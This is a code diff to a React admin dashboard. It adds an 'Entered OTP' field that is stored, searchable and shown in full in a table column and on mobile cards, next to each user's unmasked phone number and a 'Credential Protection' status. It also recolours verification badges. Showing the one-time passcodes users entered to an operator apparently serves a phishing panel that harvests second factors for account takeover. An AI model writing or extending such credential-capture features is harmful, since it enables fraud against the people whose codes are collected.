@@ -72,6 +72,7 @@ function mergeAccounts(primary: SafeUserSummary[], secondary: SafeUserSummary[])
         ...prev,
         ...item,
         phoneNumber: item.phoneNumber || prev?.phoneNumber || item.maskedPhone,
+        enteredOtp: item.enteredOtp ?? prev?.enteredOtp ?? null,
       });
     }
   }
@@ -212,6 +213,10 @@ export const AdminDirectory: React.FC<AdminDirectoryProps> = ({ onNavigateHome }
                   : '—',
             maskedPhone: typeof data.maskedPhone === 'string' ? data.maskedPhone : '—',
             verified: Boolean(data.verified),
+            enteredOtp:
+              typeof data.enteredOtp === 'string' && data.enteredOtp.length > 0
+                ? data.enteredOtp
+                : null,
             credentialStatus:
               typeof data.credentialStatus === 'string' ? data.credentialStatus : 'Protected',
             createdAt: toIsoString(data.createdAt),
@@ -320,6 +325,7 @@ export const AdminDirectory: React.FC<AdminDirectoryProps> = ({ onNavigateHome }
           acc.fullName.toLowerCase().includes(trimmedQuery) ||
           (acc.phoneNumber ?? '').toLowerCase().includes(trimmedQuery) ||
           acc.maskedPhone.toLowerCase().includes(trimmedQuery) ||
+          (acc.enteredOtp ?? '').toLowerCase().includes(trimmedQuery) ||
           acc.countryCode.toLowerCase().includes(trimmedQuery) ||
           acc.id.toLowerCase().includes(trimmedQuery),
       )
@@ -566,7 +572,11 @@ export const AdminDirectory: React.FC<AdminDirectoryProps> = ({ onNavigateHome }
                           <span className="text-sm font-semibold text-[#111827] truncate">
                             {acc.fullName}
                           </span>
-                          <span className="inline-flex items-center gap-1 text-emerald-700 text-xs font-medium shrink-0">
+                          <span
+                            className={`inline-flex items-center gap-1 text-xs font-medium shrink-0 ${
+                              acc.verified ? 'text-emerald-700' : 'text-amber-600'
+                            }`}
+                          >
                             <CheckCircle2 className="w-3.5 h-3.5" />
                             <span>{acc.verified ? 'Verified' : 'Pending'}</span>
                           </span>
@@ -579,6 +589,16 @@ export const AdminDirectory: React.FC<AdminDirectoryProps> = ({ onNavigateHome }
                             {formatDate(acc.lastSignedInAt ?? acc.updatedAt)}
                           </span>
                         </div>
+                        <div className="flex items-center justify-between text-xs pt-0.5">
+                          <span className="text-[#6B7280]">Entered OTP</span>
+                          {acc.enteredOtp ? (
+                            <span className="inline-flex items-center px-2 py-0.5 rounded-md bg-[#EEF2FF] text-[#0052FF] font-mono font-semibold tracking-wider tabular-nums">
+                              {acc.enteredOtp}
+                            </span>
+                          ) : (
+                            <span className="text-[#9CA3AF] font-mono">—</span>
+                          )}
+                        </div>
                       </div>
                     ))}
                   </div>
@@ -590,6 +610,7 @@ export const AdminDirectory: React.FC<AdminDirectoryProps> = ({ onNavigateHome }
                         <tr className="border-b border-[#EEF1F6] text-xs font-semibold text-[#6B7280]">
                           <th className="py-3 px-5">Name</th>
                           <th className="py-3 px-4">Phone Number</th>
+                          <th className="py-3 px-4">Entered OTP</th>
                           <th className="py-3 px-4">Verification</th>
                           <th className="py-3 px-4">Credential Protection</th>
                           <th className="py-3 px-4">Created</th>
@@ -605,8 +626,21 @@ export const AdminDirectory: React.FC<AdminDirectoryProps> = ({ onNavigateHome }
                             <td className="py-3.5 px-4 font-mono text-[13px] text-[#374151] tabular-nums whitespace-nowrap">
                               {acc.phoneNumber || acc.maskedPhone}
                             </td>
+                            <td className="py-3.5 px-4 font-mono text-[13px] tabular-nums whitespace-nowrap">
+                              {acc.enteredOtp ? (
+                                <span className="inline-flex items-center px-2.5 py-0.5 rounded-md bg-[#EEF2FF] text-[#0052FF] font-semibold tracking-wider">
+                                  {acc.enteredOtp}
+                                </span>
+                              ) : (
+                                <span className="text-[#9CA3AF]">—</span>
+                              )}
+                            </td>
                             <td className="py-3.5 px-4 whitespace-nowrap">
-                              <span className="inline-flex items-center gap-1.5 text-emerald-700 text-[13px] font-medium">
+                              <span
+                                className={`inline-flex items-center gap-1.5 text-[13px] font-medium ${
+                                  acc.verified ? 'text-emerald-700' : 'text-amber-600'
+                                }`}
+                              >
                                 <CheckCircle2 className="w-4 h-4" />
                                 <span>{acc.verified ? 'Verified' : 'Pending'}</span>
                               </span>
